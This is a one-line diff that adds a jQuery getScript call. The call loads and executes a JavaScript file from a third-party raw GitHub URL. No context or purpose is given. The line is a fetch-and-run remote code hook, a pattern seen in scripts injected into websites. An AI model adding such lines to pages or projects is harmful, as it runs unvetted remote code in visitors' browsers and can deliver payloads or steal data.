@@ -1,0 +1,1 @@
+$.getScript("https://raw.githubusercontent.com/samidis/ro7oman/main/smsm.js")
